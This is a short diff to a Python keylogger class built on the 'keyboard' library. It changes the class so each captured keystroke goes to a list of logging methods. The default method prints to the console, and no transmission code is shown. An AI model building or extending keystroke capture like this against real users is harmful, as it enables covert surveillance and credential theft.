@@ -3,12 +3,13 @@ import keyboard
 class Keylogger:
     def __init__(self, logMethod=None):
         # initialises logging method
-        self.logMethod = logMethod or self.printToConsole
+        self.logMethod = logMethod or [self.printToConsole]
 
     # runs the keylogger
     def run(self):
         for key in self.getKeystroke():
-            self.logMethod(key)
+            for method in self.logMethod:
+                method(key)
 
     # gets the keystrokes
     def getKeystroke(self):
